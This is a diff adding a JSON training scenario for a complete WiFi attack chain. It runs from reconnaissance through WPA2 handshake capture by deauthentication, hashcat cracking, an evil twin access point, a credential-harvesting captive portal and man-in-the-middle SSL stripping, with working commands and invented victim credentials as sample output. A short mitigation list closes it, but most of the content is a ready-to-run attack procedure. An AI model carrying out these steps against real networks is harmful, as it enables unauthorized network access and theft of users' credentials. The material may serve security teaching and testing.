@@ -1,0 +1,165 @@
+{
+  "title": "WPA2 Cracking and Evil Twin Attack Chain",
+  "description": "Complete wireless attack from reconnaissance to credential harvesting via WPA2 cracking and evil twin AP",
+  "difficulty": "intermediate",
+  "estimated_time": "60 minutes",
+  "tools_used": [
+    "aircrack-ng",
+    "hashcat",
+    "hostapd",
+    "dnsmasq",
+    "aireplay-ng"
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "title": "Enable Monitor Mode",
+      "command": "airmon-ng start wlan0",
+      "explanation": "Put wireless interface into monitor mode to capture all WiFi packets in range",
+      "expected_output": "Monitor mode enabled on wlan0mon - ready for packet capture and injection",
+      "success_criteria": "wlan0mon interface created"
+    },
+    {
+      "step": 2,
+      "title": "Wireless Network Reconnaissance",
+      "command": "airodump-ng wlan0mon",
+      "explanation": "Scan for all WiFi networks and connected clients to identify targets",
+      "expected_output": "OfficeMain (WPA2, channel 6, -38 dBm, 5 clients), CorporateWiFi (WPA2, channel 11)",
+      "success_criteria": "Target networks identified with client activity"
+    },
+    {
+      "step": 3,
+      "title": "Targeted Network Capture",
+      "command": "airodump-ng -c 6 --bssid DD:EE:FF:00:11:22 -w capture wlan0mon",
+      "explanation": "Lock onto target AP (OfficeMain) on channel 6 and capture traffic to file",
+      "expected_output": "Capturing on channel 6, monitoring OfficeMain with 5 active clients",
+      "success_criteria": "Focused capture active, clients visible"
+    },
+    {
+      "step": 4,
+      "title": "Deauthentication Attack",
+      "command": "aireplay-ng --deauth 10 -a DD:EE:FF:00:11:22 -c AB:CD:EF:12:34:56 wlan0mon",
+      "explanation": "Send deauth packets to force client AB:CD:EF:12:34:56 to disconnect and reconnect",
+      "expected_output": "10 deauth packets sent, client disconnected, WPA handshake captured in 3 seconds",
+      "success_criteria": "airodump shows 'WPA handshake: DD:EE:FF:00:11:22'"
+    },
+    {
+      "step": 5,
+      "title": "Verify Handshake Quality",
+      "command": "aircrack-ng capture-01.cap",
+      "explanation": "Check if captured handshake is complete and valid for cracking",
+      "expected_output": "1 handshake found for DD:EE:FF:00:11:22 (OfficeMain) - ready for cracking",
+      "success_criteria": "Valid handshake confirmed"
+    },
+    {
+      "step": 6,
+      "title": "Convert to Hashcat Format",
+      "command": "hcxpcapngtool -o hashes.hc22000 capture-01.cap",
+      "explanation": "Convert PCAP to hashcat 22000 format for GPU-accelerated cracking",
+      "expected_output": "2 handshakes converted to hc22000 format, ready for hashcat",
+      "success_criteria": "hashes.hc22000 file created"
+    },
+    {
+      "step": 7,
+      "title": "GPU-Accelerated Password Cracking",
+      "command": "hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt",
+      "explanation": "Crack WPA2 password using GPU and rockyou wordlist",
+      "expected_output": "Password cracked in 1min 47sec: office2024! (341.2 kH/s with RTX 3080)",
+      "success_criteria": "Password recovered: office2024!"
+    },
+    {
+      "step": 8,
+      "title": "Evil Twin AP Configuration",
+      "command": "cat > hostapd.conf << EOF\ninterface=wlan0\nssid=OfficeMain\nchannel=6\nwpa=2\nwpa_passphrase=office2024!\nEOF",
+      "explanation": "Create configuration for evil twin AP matching target network exactly",
+      "expected_output": "hostapd.conf created with cloned SSID, channel, and cracked password",
+      "success_criteria": "Configuration file ready for evil twin"
+    },
+    {
+      "step": 9,
+      "title": "Network Interface Setup",
+      "command": "ifconfig wlan0 192.168.10.1 netmask 255.255.255.0 && echo 1 > /proc/sys/net/ipv4/ip_forward",
+      "explanation": "Configure IP address for evil twin network and enable packet forwarding",
+      "expected_output": "wlan0 configured as 192.168.10.1, IP forwarding enabled for routing",
+      "success_criteria": "Interface has IP, forwarding active"
+    },
+    {
+      "step": 10,
+      "title": "DHCP and DNS Server",
+      "command": "dnsmasq -C dnsmasq.conf -d",
+      "explanation": "Start DHCP server to assign IPs to connecting clients and DNS for captive portal",
+      "expected_output": "DHCP range 192.168.10.10-100 active, DNS spoofing to 192.168.10.1",
+      "success_criteria": "dnsmasq running and ready"
+    },
+    {
+      "step": 11,
+      "title": "Launch Evil Twin AP",
+      "command": "hostapd hostapd.conf",
+      "explanation": "Start fake access point with identical SSID and cracked password",
+      "expected_output": "AP 'OfficeMain' broadcasting on channel 6, ready to accept connections",
+      "success_criteria": "hostapd shows AP-ENABLED"
+    },
+    {
+      "step": 12,
+      "title": "Deauth Real AP Clients",
+      "command": "aireplay-ng --deauth 0 -a DD:EE:FF:00:11:22 wlan0mon",
+      "explanation": "Continuously deauth clients from legitimate AP to force connection to evil twin",
+      "expected_output": "Clients disconnect from real AP, reconnect to evil twin (stronger signal)",
+      "success_criteria": "Clients connect to our AP"
+    },
+    {
+      "step": 13,
+      "title": "Captive Portal Deployment",
+      "command": "python3 -m http.server 80 --directory /var/www/html/portal",
+      "explanation": "Serve credential harvesting page that appears when clients connect",
+      "expected_output": "HTTP server on port 80 serving fake WiFi login portal",
+      "success_criteria": "Web server accessible"
+    },
+    {
+      "step": 14,
+      "title": "Monitor Credential Capture",
+      "command": "tail -f /var/log/evil_twin_creds.log",
+      "explanation": "Watch real-time credential submissions from victims using captive portal",
+      "expected_output": "3 credentials captured: john.doe/JohnPass123!, jane.smith/SmithPass2024!, admin/AdminCorp!",
+      "success_criteria": "Corporate credentials harvested"
+    },
+    {
+      "step": 15,
+      "title": "Traffic Analysis and MITM",
+      "command": "bettercap -iface wlan0 -caplet mitm.cap",
+      "explanation": "Perform man-in-the-middle on evil twin traffic to capture additional credentials",
+      "expected_output": "SSL strip active, HTTP POST credentials captured from internal sites",
+      "success_criteria": "Additional plaintext credentials obtained"
+    }
+  ],
+  "learning_objectives": [
+    "WiFi reconnaissance and target selection based on signal strength and activity",
+    "WPA2 handshake capture using deauthentication attacks",
+    "GPU-accelerated password cracking with hashcat",
+    "Evil twin access point deployment with matching SSID and password",
+    "Network infrastructure setup (DHCP, DNS, routing)",
+    "Captive portal social engineering for credential harvesting",
+    "Man-in-the-middle attacks on WiFi clients",
+    "SSL stripping for HTTPS downgrade attacks"
+  ],
+  "mitigation": [
+    "Use WPA3 instead of WPA2 (resistant to offline cracking)",
+    "Implement strong, random passphrase (20+ characters)",
+    "Enable 802.11w Management Frame Protection to prevent deauth attacks",
+    "Use certificate pinning for critical applications",
+    "Educate users to verify WiFi network legitimacy",
+    "Implement wireless intrusion detection systems (WIDS)",
+    "Disable SSID broadcasting for sensitive networks",
+    "Use VPN for all sensitive traffic even on trusted WiFi",
+    "Monitor for rogue access points with identical SSIDs"
+  ],
+  "tags": [
+    "wifi",
+    "wpa2",
+    "handshake",
+    "evil_twin",
+    "captive_portal",
+    "mitm",
+    "credential_harvesting"
+  ]
+}
